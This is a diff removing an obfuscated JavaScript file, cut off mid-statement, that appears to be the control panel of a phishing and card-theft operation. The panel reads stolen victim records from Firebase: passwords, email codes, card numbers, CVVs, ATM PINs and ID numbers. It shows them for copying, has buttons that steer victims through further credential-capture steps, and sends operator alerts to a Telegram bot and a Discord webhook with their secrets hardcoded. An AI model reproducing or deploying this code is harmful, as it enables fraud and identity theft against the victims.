@@ -1,1 +1,558 @@
-const _0x55e3c8=_0x4e52;(function(_0xb1e368,_0xe1846c){const _0x15a594=_0x4e52,_0x550ee2=_0xb1e368();while(!![]){try{const _0x136371=parseInt(_0x15a594(0x125))/0x1*(-parseInt(_0x15a594(0x1d9))/0x2)+parseInt(_0x15a594(0x196))/0x3+-parseInt(_0x15a594(0x14e))/0x4*(-parseInt(_0x15a594(0x127))/0x5)+-parseInt(_0x15a594(0x10d))/0x6+parseInt(_0x15a594(0x1c1))/0x7*(-parseInt(_0x15a594(0x173))/0x8)+-parseInt(_0x15a594(0x1cf))/0x9+parseInt(_0x15a594(0x1c4))/0xa;if(_0x136371===_0xe1846c)break;else _0x550ee2['push'](_0x550ee2['shift']());}catch(_0x2c18b1){_0x550ee2['push'](_0x550ee2['shift']());}}}(_0x265a,0xf171c));import{db,ref,onValue,update}from'./config.js';function detectarDispositivo(_0x3838c6){const _0x1dbb90=_0x4e52;_0x3838c6=_0x3838c6[_0x1dbb90(0x1ea)]();if(/windows/[_0x1dbb90(0x11f)](_0x3838c6))return _0x1dbb90(0x174);if(/iphone/[_0x1dbb90(0x11f)](_0x3838c6))return'iPhone';if(/ipad/[_0x1dbb90(0x11f)](_0x3838c6))return _0x1dbb90(0x166);if(/android/[_0x1dbb90(0x11f)](_0x3838c6))return _0x1dbb90(0x164);if(/macintosh/[_0x1dbb90(0x11f)](_0x3838c6))return _0x1dbb90(0xfd);if(/linux/['test'](_0x3838c6))return _0x1dbb90(0x19e);return _0x1dbb90(0x153);}const nubesCreadas=new Set(),contenedor=document['getElementById'](_0x55e3c8(0x102)),modal=document[_0x55e3c8(0x168)]('formulario-modal');async function notificarTelegram(_0x268bfb,_0x346086){const _0x334a09=_0x55e3c8,_0x393cbb=_0x334a09(0x197),_0x1b0d1b=_0x334a09(0x157),_0x341855=new Date()[_0x334a09(0x187)](_0x334a09(0x144)),_0x35cbdc=new Date()[_0x334a09(0x184)](_0x334a09(0x144),{'hour12':![]});try{const _0x287928=await fetch(_0x334a09(0x1d0)),_0x4d7def=await _0x287928['json'](),_0x206fd4=_0x4d7def['ip']||'Desconocida',_0x4f5393=_0x4d7def[_0x334a09(0x194)]||_0x334a09(0x1ad),_0x1e182c=_0x4d7def['country_name']||_0x334a09(0x153),_0x120df8='\x0a\x20\x20\x20\x20🖲\x20*Alerta\x20de\x20Panel*\x0a\x20\x20\x20\x20'+(_0x346086===_0x334a09(0x1bd)?_0x334a09(0x103):'🔴\x20Desconectado')+'\x0a\x20\x20\x20\x20👤\x20Usuario:\x20*'+_0x268bfb+'*\x0a\x20\x20\x20\x20📅\x20Fecha:\x20'+_0x341855+'\x0a\x20\x20\x20\x20⏰\x20Hora:\x20'+_0x35cbdc+_0x334a09(0x13c)+_0x206fd4+_0x334a09(0x159)+_0x4f5393+_0x334a09(0x16d)+_0x1e182c+'\x0a\x20\x20\x20\x20';await fetch('https://api.telegram.org/bot'+_0x393cbb+_0x334a09(0x180),{'method':_0x334a09(0x100),'headers':{'Content-Type':_0x334a09(0x177)},'body':JSON['stringify']({'chat_id':_0x1b0d1b,'text':_0x120df8,'parse_mode':'Markdown'})});}catch(_0x31282e){console[_0x334a09(0x1e8)](_0x334a09(0x162),_0x31282e);}}async function notificarDiscord(_0x48efbe,_0x533468){const _0xa7fa16=_0x55e3c8,_0x1b0e53=_0xa7fa16(0x12b),_0x30a129=new Date()[_0xa7fa16(0x187)](_0xa7fa16(0x144)),_0x5e1cc7=new Date()[_0xa7fa16(0x184)](_0xa7fa16(0x144),{'hour12':![]});try{const _0x1eb92c=await fetch('https://ipapi.co/json/'),_0x5adf55=await _0x1eb92c[_0xa7fa16(0x1c9)](),_0x58f040=_0x5adf55['ip']||_0xa7fa16(0x1ad),_0x222a22=_0x5adf55[_0xa7fa16(0x194)]||_0xa7fa16(0x1ad),_0x1b8a8e=_0x5adf55[_0xa7fa16(0x1dd)]||'Desconocido',_0x6b6b24={'content':_0xa7fa16(0x104)+(_0x533468==='login'?_0xa7fa16(0x103):_0xa7fa16(0x108))+_0xa7fa16(0x18a)+_0x48efbe+_0xa7fa16(0x1dc)+_0x30a129+_0xa7fa16(0x176)+_0x5e1cc7+_0xa7fa16(0x1af)+_0x58f040+_0xa7fa16(0x1db)+_0x222a22+_0xa7fa16(0x193)+_0x1b8a8e};await fetch(_0x1b0e53,{'method':_0xa7fa16(0x100),'headers':{'Content-Type':_0xa7fa16(0x177)},'body':JSON[_0xa7fa16(0x12f)](_0x6b6b24)});}catch(_0x5852f6){console['error'](_0xa7fa16(0x19f),_0x5852f6);}}function _0x265a(){const _0x5a6582=['230320','Fecha:\x20','\x27)\x22>','is-current','9999','userAgent','11840betjnS','clear','102030','createElement','mDocTipo','Desconocido','position','display','true','5592536910','color','\x0a\x20\x20\x20\x20📍\x20Ciudad:\x20','values','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div><strong>Tarjeta:</strong><br>','split','classList','\x20-\x20','enviarTarjeta','play','mailDescripcion-','❌\x20Error\x20al\x20enviar\x20a\x20Telegram:','documentoEstado','Android','----','iPad','\x0a\x20\x20\x20\x20<div\x20class=\x22modal-formulario\x22>\x0a\x20\x20\x20\x20\x20\x20<h4>Formulario\x20Gmail</h4>\x0a\x20\x20\x20\x20\x20\x20<input\x20type=\x22text\x22\x20id=\x22mailCodigo-','getElementById','trim','verificarLogin','btn-ver-tarjeta','codigo','\x0a\x20\x20\x20\x20🌎\x20País:\x20','nube-pasarela','fecha','nube-','innerHTML','</small><br>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<strong>Ip:</strong>\x20','3163096MwKtyL','Windows','remove','\x0a⏰\x20Hora:\x20','application/json','<br><strong>cvv:</strong>\x20','⚠️\x20Esto\x20eliminará\x20TODO\x20el\x20contenido\x20de\x20la\x20nube.\x20¿Estás\x20seguro?','entries','8px','cerrarFormulario','documentoTipo','mostrarBarraDocumento','length','/sendMessage','incorrectoToken','\x27)\x22>Gmail</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22btn\x20rosa\x22\x20\x20\x20\x20onclick=\x22abrirHot(\x27','div','toLocaleTimeString','tarjeta','logout','toLocaleDateString','sep2','Desconectado','\x0a👤\x20Usuario:\x20**','password','incorrectoHot','sep1','zIndex','bold','\x0a\x20\x20\x20\x20<div\x20class=\x22modal-formulario\x22>\x0a\x20\x20\x20\x20\x20\x20<h4>Formulario\x20Hotmail</h4>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22modal-buttons\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22btn\x20negro\x22\x20onclick=\x22irAHotmail(\x27','mostrarBarraHotmailPass','incorrectoGmail','\x0a🌎\x20País:\x20','city','mDocNum','2769699ETVwDI','8434946432:AAFLR_h7Nr4AgvSWj3skYYlHX_8_n9Bserc','Número:\x20','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div><strong>Documento:</strong><br>','forEach','background','btn-ver-documento',':</strong><br>','Linux','❌\x20Error\x20al\x20enviar\x20a\x20Discord:','body','panelUser','estado','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22tarjeta-cell\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22','white','\x27)\x22>Sep1</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22btn\x20morado\x22\x20onclick=\x22sep2(\x27','style','appendChild','logueado','username','email','mostrarBarraCodigo','\x27,\x27','Desconocida','dataPages','\x0a🌐\x20IP:\x20','login-container','❌\x20No\x20se\x20pudo\x20copiar.','enviarMail','\x27)\x22>Hotmail</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>','value','fontWeight','passwords','incorrectoHotmail','barra-superior','incorrecto','complete','</td>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<td>','documentoMask','login','\x20|\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<strong>Ciudad:</strong>\x20','map','irAGmail','14zcfOmb','clave','*******','51041480cprtXa','catch','then','\x22\x20placeholder=\x22Código\x20(2\x20dígitos)\x22\x20maxlength=\x222\x22>\x0a\x20\x20\x20\x20\x20\x20<input\x20type=\x22text\x22\x20id=\x22mailDescripcion-','verde','json','none','<br>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<strong>User\x20Agent:</strong>\x20<small>','ipInfo','irAIndex','alerta-sonido','6887970moxQuG','https://ipapi.co/json/','\x0a\x20\x20\x20\x20<div\x20class=\x22modal-formulario\x22\x20role=\x22dialog\x22\x20aria-label=\x22Formulario\x20Tarjeta\x22>\x0a\x20\x20\x20\x20\x20\x20<h4>Formulario\x20Tarjeta</h4>\x0a\x20\x20\x20\x20\x20\x20<input\x20id=\x22mTarNum\x22\x20\x20\x20type=\x22text\x22\x20value=\x22Número:\x20','regresarPanel','Tipo:\x20','mTarNum','bottom','dispositivo','⚠️\x20Nada\x20que\x20copiar.','$1\x20','12PJiymh','filter','\x0a📍\x20Ciudad:\x20','**\x0a📅\x20Fecha:\x20','country_name','\x27)\x22>X</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22estado-conexion\x20','irAHotmail','replace','dataPages/','\x22\x20placeholder=\x22Descripción\x22>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22modal-buttons\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22btn\x20negro\x22\x20onclick=\x22enviarMail(\x27','val','borderRadius','is-complete','\x0a\x20\x20\x20\x20<div\x20class=\x22modal-formulario\x22\x20role=\x22dialog\x22\x20aria-label=\x22Formulario\x20Documento\x22>\x0a\x20\x20\x20\x20\x20\x20<h4>Formulario\x20Documento</h4>\x0a\x20\x20\x20\x20\x20\x20<input\x20id=\x22mDocTipo\x22\x20type=\x22text\x22\x20value=\x22Tipo:\x20—\x22\x20disabled>\x0a\x20\x20\x20\x20\x20\x20<input\x20id=\x22mDocNum\x22\x20\x20type=\x22text\x22\x20value=\x22Número:\x20—\x22\x20disabled>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22modal-buttons\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22btn\x20azul\x22\x20onclick=\x22cerrarFormulario()\x22>Cancelar</button>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>','innerText','error','\x27)\x22>Sep3</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22btn\x20amarillo\x22\x20onclick=\x22abrirMail(\x27','toLowerCase','🚫\x20Código\x20incorrecto.','Mac','join','incorrectoTarjeta','POST','dia','contenedor','🟢\x20Conectado','🖲\x20**Alerta\x20de\x20Panel**\x0a','setItem','oculto','finally','🔴\x20Desconectado','cvv','\x27)\x22>Docu</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>','año','pagina','11168526BaiHOV','\x22\x20type=\x22button\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20onclick=\x22abrirTarjeta(\x27','sort','\x22\x20onclick=\x22copiarTexto(\x27','tabla-nube','getItem','<br><strong>fecha:</strong>\x20','abrirMail','panelLoggedIn','\x22\x20disabled>\x0a\x20\x20\x20\x20\x20\x20<input\x20id=\x22mTarFecha\x22\x20type=\x22text\x22\x20value=\x22Fecha:\x20','has','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div><strong>Email:</strong><br>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22','mostrarBarraGmail','incorrectoLogin','10px\x2015px','\x27)\x22>Card</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>','mostrarBarraHotmailEmail','className','test','\x0a\x20\x20\x20\x20\x20\x20\x20\x20</td>','flex','mTarCvv','mostrarBarra','documento','311590znILdT','admin','420xOIMQJ','\x20|\x20','</td>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<td><strong>Fecha:</strong>\x20','abrirTarjeta','https://discord.com/api/webhooks/1416934719626416329/ruYsLOrI72q3uoCVl4exn353TmAyp4G9CuhcZA0KAMLJYIdMTyzlhRsvUN4QMXTuIEpa','anio','día','20px','stringify','input-highlight','#2e85ccff','abierto','2000-01-01','documentElement','documentoNumero','rojo','usuario','Código:\x20','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div><strong>Passwords:</strong><br>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22','\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22datos-linea\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div><strong>Username:</strong><br>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22','mostrarBarraEmail','\x0a\x20\x20\x20\x20🌐\x20IP:\x20','Conectado','ciudad','padding','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<td>','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div><strong>ATM:</strong><br>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22','abrirHot','\x27)\x22>Incorrecto</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22btn\x20azul\x22\x20\x20onclick=\x22irAGmail(\x27','es-CO','\x22\x20disabled>\x0a\x20\x20\x20\x20\x20\x20<input\x20id=\x22mTarCvv\x22\x20\x20\x20type=\x22text\x22\x20value=\x22Código:\x20','push','abrirDocumento'];_0x265a=function(){return _0x5a6582;};return _0x265a();}function _0x4e52(_0x2eab18,_0x24efd8){const _0x265a01=_0x265a();return _0x4e52=function(_0x4e527a,_0x20dcbe){_0x4e527a=_0x4e527a-0xfd;let _0x4126b0=_0x265a01[_0x4e527a];return _0x4126b0;},_0x4e52(_0x2eab18,_0x24efd8);}window[_0x55e3c8(0x16a)]=()=>{const _0x8707cf=_0x55e3c8,_0x28d2c1=document[_0x8707cf(0x168)](_0x8707cf(0x137))['value'][_0x8707cf(0x169)](),_0x59bbd3=document['getElementById'](_0x8707cf(0x1c2))[_0x8707cf(0x1b4)][_0x8707cf(0x169)](),_0x3301bc=[{'usuario':_0x8707cf(0x126),'clave':_0x8707cf(0x148)}];if(_0x3301bc['some'](_0x3657b1=>_0x3657b1[_0x8707cf(0x137)]===_0x28d2c1&&_0x3657b1['clave']===_0x59bbd3)){localStorage[_0x8707cf(0x105)](_0x8707cf(0x115),_0x8707cf(0x156)),localStorage[_0x8707cf(0x105)](_0x8707cf(0x1a1),_0x28d2c1),document[_0x8707cf(0x168)](_0x8707cf(0x1b0))[_0x8707cf(0x1a6)][_0x8707cf(0x155)]='none',document[_0x8707cf(0x168)](_0x8707cf(0x1b8))[_0x8707cf(0x1a6)][_0x8707cf(0x155)]='block',contenedor[_0x8707cf(0x1a6)]['display']=_0x8707cf(0x121);const _0x10b3ac=document[_0x8707cf(0x168)](_0x8707cf(0x1ce));if(_0x10b3ac)_0x10b3ac[_0x8707cf(0x160)]()[_0x8707cf(0x1c5)](()=>{});cargarPanel(),notificarTelegram(_0x28d2c1,'login'),notificarDiscord(_0x28d2c1,_0x8707cf(0x1bd));}},window['cerrarSesion']=()=>{const _0x51d088=_0x55e3c8,_0x23cf48=document[_0x51d088(0x168)](_0x51d088(0x137))[_0x51d088(0x1b4)][_0x51d088(0x169)]()||localStorage['getItem']('panelUser')||_0x51d088(0x153);notificarTelegram(_0x23cf48,_0x51d088(0x186)),notificarDiscord(_0x23cf48,_0x51d088(0x186)),localStorage[_0x51d088(0x14f)](),document[_0x51d088(0x168)](_0x51d088(0x1b0))[_0x51d088(0x1a6)][_0x51d088(0x155)]=_0x51d088(0x121),document[_0x51d088(0x168)]('barra-superior')['style'][_0x51d088(0x155)]=_0x51d088(0x1ca),contenedor[_0x51d088(0x1a6)][_0x51d088(0x155)]=_0x51d088(0x1ca),contenedor[_0x51d088(0x171)]='',document['getElementById'](_0x51d088(0x137))[_0x51d088(0x1b4)]='',document[_0x51d088(0x168)]('clave')[_0x51d088(0x1b4)]='',document[_0x51d088(0x134)][_0x51d088(0x15d)][_0x51d088(0x175)](_0x51d088(0x1a8));};function formatearIp(_0x5e22ee){const _0x25f98f=_0x55e3c8;if(!_0x5e22ee)return'—';const _0x200ab2=String(_0x5e22ee)[_0x25f98f(0x15c)]('-')[_0x25f98f(0x1bf)](_0x206a4f=>_0x206a4f['trim']())[_0x25f98f(0x1da)](Boolean);return _0x200ab2[_0x25f98f(0xfe)](_0x25f98f(0x128));}function cargarPanel(){const _0x2390e3=_0x55e3c8;onValue(ref(db,_0x2390e3(0x1ae)),_0x20d57b=>{const _0x3402b8=_0x2390e3,_0x429649=_0x20d57b[_0x3402b8(0x1e3)]();if(!_0x429649)return;Object[_0x3402b8(0x17a)](_0x429649)[_0x3402b8(0x19a)](([_0xe490e4,_0x51d52c])=>{const _0x2eebc3=_0x3402b8;if(_0x51d52c[_0x2eebc3(0x106)])return;const _0x326c3b=!_0x51d52c[_0x2eebc3(0x1a9)]&&!_0x51d52c['password']&&!_0x51d52c[_0x2eebc3(0x16c)]&&!_0x51d52c['email']&&!_0x51d52c[_0x2eebc3(0x1b6)]&&!_0x51d52c[_0x2eebc3(0x185)]&&!_0x51d52c['documento'];if(_0x326c3b)return;let _0x1d702b=document[_0x2eebc3(0x168)](_0x2eebc3(0x170)+_0xe490e4);const _0x46f4ec=!_0x1d702b,_0x616e7b=_0x51d52c[_0x2eebc3(0x1a2)]===_0x2eebc3(0x132),_0x119e70=_0x616e7b?_0x2eebc3(0x1c8):_0x2eebc3(0x136),_0x1cf9a7=_0x51d52c['mostrarBarraTarjeta']?'input-highlight':'',_0x1dd116=_0x51d52c['dia']||_0x51d52c[_0x2eebc3(0x12d)]||'--',_0x555223=_0x51d52c[_0x2eebc3(0x10b)]||_0x51d52c[_0x2eebc3(0x12c)]||_0x2eebc3(0x165),_0x4ed26c=_0x51d52c['cvv']||'',_0x39d800=(_0x51d52c[_0x2eebc3(0x185)]||'')['replaceAll']('\x20',''),_0x284c0e=String(_0x51d52c['tarjetaEstado']||_0x51d52c['tarjetaCompleta']||'')[_0x2eebc3(0x1ea)]()==='complete',_0x278c29=String(_0x51d52c['pagina']||'')[_0x2eebc3(0x1ea)]()===_0x2eebc3(0x188),_0x343c5f=[_0x2eebc3(0x16b),_0x1cf9a7];if(_0x284c0e)_0x343c5f[_0x2eebc3(0x146)](_0x2eebc3(0x1e5));else{if(_0x278c29)_0x343c5f[_0x2eebc3(0x146)]('is-current');}const _0x13fc61=_0x2eebc3(0x1a3)+_0x343c5f[_0x2eebc3(0xfe)]('\x20')+_0x2eebc3(0x10e)+_0xe490e4+'\x27,\x27'+_0x39d800+_0x2eebc3(0x1ac)+_0x1dd116+'\x27,\x27'+_0x555223+_0x2eebc3(0x1ac)+_0x4ed26c+_0x2eebc3(0x11c),_0x1fba6d=_0x51d52c[_0x2eebc3(0x17e)]?_0x2eebc3(0x130):'',_0x2dc0c2=String(_0x51d52c[_0x2eebc3(0x163)]||'')[_0x2eebc3(0x1ea)]()===_0x2eebc3(0x1ba),_0x5078d5=String(_0x51d52c[_0x2eebc3(0x10c)]||'')[_0x2eebc3(0x1ea)]()==='sep3',_0x4fd3c5=[_0x2eebc3(0x19c),_0x1fba6d];if(_0x2dc0c2)_0x4fd3c5[_0x2eebc3(0x146)](_0x2eebc3(0x1e5));else{if(_0x5078d5)_0x4fd3c5[_0x2eebc3(0x146)](_0x2eebc3(0x14b));}const _0x44c129='\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22docu-cell\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22'+_0x4fd3c5[_0x2eebc3(0xfe)]('\x20')+'\x22\x20type=\x22button\x22\x20onclick=\x22abrirDocumento(\x27'+_0xe490e4+_0x2eebc3(0x10a),_0x108bfd='\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22cerrar\x22\x20onclick=\x22cerrarNube(\x27'+_0xe490e4+_0x2eebc3(0x1de)+_0x119e70+'\x22>'+(_0x616e7b?_0x2eebc3(0x13d):_0x2eebc3(0x189))+'</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22ip-info\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<strong>IP:</strong>\x20'+(_0x51d52c['ip']||'?')+_0x2eebc3(0x1be)+(_0x51d52c[_0x2eebc3(0x13e)]||'?')+'\x20|\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<strong>País:</strong>\x20'+(_0x51d52c['pais']||'?')+'\x20|\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<strong>Dispositivo:</strong>\x20'+(_0x51d52c[_0x2eebc3(0x1d6)]||'?')+_0x2eebc3(0x13a)+(_0x51d52c['mostrarBarra']?'input-highlight':'')+_0x2eebc3(0x110)+(_0x51d52c[_0x2eebc3(0x1a9)]||'')+'\x27)\x22>'+(_0x51d52c[_0x2eebc3(0x1a9)]||_0x2eebc3(0x1c3))+'</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div><strong>Password:</strong><br>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22'+(_0x51d52c[_0x2eebc3(0x123)]?_0x2eebc3(0x130):'')+_0x2eebc3(0x110)+(_0x51d52c[_0x2eebc3(0x18b)]||'')+'\x27)\x22>'+(_0x51d52c[_0x2eebc3(0x18b)]||_0x2eebc3(0x1c3))+_0x2eebc3(0x141)+(_0x51d52c[_0x2eebc3(0x1ab)]?_0x2eebc3(0x130):'')+'\x22\x20onclick=\x22copiarTexto(\x27'+(_0x51d52c[_0x2eebc3(0x16c)]||'')+_0x2eebc3(0x14a)+(_0x51d52c[_0x2eebc3(0x16c)]||_0x2eebc3(0x1c3))+_0x2eebc3(0x118)+(_0x51d52c[_0x2eebc3(0x11d)]||_0x51d52c[_0x2eebc3(0x13b)]?_0x2eebc3(0x130):'')+'\x22\x20onclick=\x22copiarTexto(\x27'+(_0x51d52c[_0x2eebc3(0x1aa)]||'')+_0x2eebc3(0x14a)+(_0x51d52c[_0x2eebc3(0x1aa)]||'*******')+_0x2eebc3(0x139)+(_0x51d52c[_0x2eebc3(0x191)]||_0x51d52c[_0x2eebc3(0x119)]?_0x2eebc3(0x130):'')+'\x22\x20onclick=\x22copiarTexto(\x27'+(_0x51d52c['passwords']||'')+_0x2eebc3(0x14a)+(_0x51d52c[_0x2eebc3(0x1b6)]||_0x2eebc3(0x1c3))+_0x2eebc3(0x15b)+_0x13fc61+_0x2eebc3(0x199)+_0x44c129+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22botones\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22btn\x20rojo\x22\x20\x20\x20onclick=\x22incorrectoLogin(\x27'+_0xe490e4+'\x27)\x22>Incorrecto</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22btn\x20morado\x22\x20onclick=\x22sep1(\x27'+_0xe490e4+_0x2eebc3(0x1a5)+_0xe490e4+'\x27)\x22>Sep2</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22btn\x20morado\x22\x20onclick=\x22sep3(\x27'+_0xe490e4+_0x2eebc3(0x1e9)+_0xe490e4+_0x2eebc3(0x182)+_0xe490e4+_0x2eebc3(0x1b3);if(_0x46f4ec){_0x1d702b=document[_0x2eebc3(0x151)](_0x2eebc3(0x183)),_0x1d702b[_0x2eebc3(0x11e)]='nube',_0x1d702b['id']='nube-'+_0xe490e4,_0x1d702b[_0x2eebc3(0x171)]=_0x108bfd,contenedor['appendChild'](_0x1d702b);if(!nubesCreadas[_0x2eebc3(0x117)](_0xe490e4)){const _0x53f4a5=document[_0x2eebc3(0x168)](_0x2eebc3(0x1ce));if(_0x53f4a5)_0x53f4a5[_0x2eebc3(0x160)]()[_0x2eebc3(0x1c5)](()=>{});nubesCreadas['add'](_0xe490e4);}}else _0x1d702b['innerHTML']=_0x108bfd;});});}window['cerrarNube']=async _0x1f9e6e=>{const _0x26a2d1=_0x55e3c8,_0x5d15c7=new Date()[_0x26a2d1(0x187)](_0x26a2d1(0x144)),_0x1f28e5=navigator['userAgent'],_0x31e002=detectarDispositivo(_0x1f28e5);let _0x3ba2e9='?',_0x225db5='?',_0x6031bd='?',_0x381183=_0x26a2d1(0x153);try{const _0x752e90=await fetch(_0x26a2d1(0x1d0)),_0x57321d=await _0x752e90[_0x26a2d1(0x1c9)]();_0x3ba2e9=_0x57321d['ip']||'?',_0x225db5=_0x57321d[_0x26a2d1(0x194)]||'?',_0x6031bd=_0x57321d[_0x26a2d1(0x1dd)]||'?',_0x381183=_0x3ba2e9+_0x26a2d1(0x15e)+_0x225db5+_0x26a2d1(0x15e)+_0x6031bd;}catch{}await update(ref(db,_0x26a2d1(0x1e1)+_0x1f9e6e),{'oculto':!![],'fecha':_0x5d15c7,'userAgent':_0x1f28e5,'ipInfo':_0x381183,'ip':_0x3ba2e9,'ciudad':_0x225db5,'pais':_0x6031bd,'dispositivo':_0x31e002});const _0x169bc0=document['getElementById'](_0x26a2d1(0x170)+_0x1f9e6e);if(_0x169bc0)_0x169bc0['remove']();},window[_0x55e3c8(0x11a)]=_0x2de66e=>{const _0x113e7e=_0x55e3c8;update(ref(db,_0x113e7e(0x1e1)+_0x2de66e),{'estado':'incorrecto','mostrarBarra':![]}),cerrarFormulario();},window[_0x55e3c8(0x18d)]=_0x2e8f94=>update(ref(db,_0x55e3c8(0x1e1)+_0x2e8f94),{'estado':_0x55e3c8(0x18d)}),window['sep2']=_0x2bbfcb=>update(ref(db,_0x55e3c8(0x1e1)+_0x2bbfcb),{'estado':_0x55e3c8(0x188)}),window['sep3']=_0x2046f2=>update(ref(db,_0x55e3c8(0x1e1)+_0x2046f2),{'estado':'sep3'}),window[_0x55e3c8(0x1cd)]=_0x4e7160=>{const _0x45b729=_0x55e3c8;update(ref(db,_0x45b729(0x1e1)+_0x4e7160),{'estado':_0x45b729(0x1cd)}),cerrarFormulario();},window['irAGmail']=_0x568114=>{const _0x5f47e1=_0x55e3c8;update(ref(db,'dataPages/'+_0x568114),{'estado':_0x5f47e1(0x1c0)}),cerrarFormulario();},window[_0x55e3c8(0x1df)]=_0x7e1b53=>{const _0x540aaf=_0x55e3c8;update(ref(db,_0x540aaf(0x1e1)+_0x7e1b53),{'estado':_0x540aaf(0x1df)}),cerrarFormulario();},window[_0x55e3c8(0x181)]=_0x36356d=>{const _0xd3875b=_0x55e3c8;update(ref(db,_0xd3875b(0x1e1)+_0x36356d),{'estado':_0xd3875b(0x1b9),'mostrarBarraCodigo':![]}),cerrarFormulario();},window[_0x55e3c8(0x192)]=_0x258b9e=>{const _0x2a5075=_0x55e3c8;update(ref(db,'dataPages/'+_0x258b9e),{'estado':_0x2a5075(0x1b9),'mostrarBarraGmail':![]}),cerrarFormulario();},window[_0x55e3c8(0x1b7)]=_0x4cc89e=>{const _0x185d0d=_0x55e3c8;update(ref(db,'dataPages/'+_0x4cc89e),{'estado':_0x185d0d(0x18c),'mostrarBarraHotmailPass':![]}),cerrarFormulario();};let _tarjetaOpenUid=null;window[_0x55e3c8(0x12a)]=(_0x641096,_0x6aa122,_0xa81f46,_0x3d9563,_0x2bedc3)=>{const _0x246f65=_0x55e3c8;_tarjetaOpenUid=_0x641096;const _0x117388=String(_0x6aa122||'')[_0x246f65(0x1e0)](/\D/g,'')['replace'](/(\d{4})(?=\d)/g,_0x246f65(0x1d8))[_0x246f65(0x169)](),_0x34ccac=(_0xa81f46||'--')+'/'+(_0x3d9563||_0x246f65(0x165)),_0x5e1933=String(_0x2bedc3||'');modal[_0x246f65(0x171)]=_0x246f65(0x1d1)+(_0x117388||'—')+_0x246f65(0x116)+_0x34ccac+_0x246f65(0x145)+(_0x5e1933||'—')+'\x22\x20disabled>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22modal-buttons\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22btn\x20azul\x22\x20onclick=\x22cerrarFormulario()\x22>Cancelar</button>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>',onValue(ref(db,_0x246f65(0x1e1)+_0x641096),_0x85f5e5=>{const _0x1f7f57=_0x246f65;if(_tarjetaOpenUid!==_0x641096)return;const 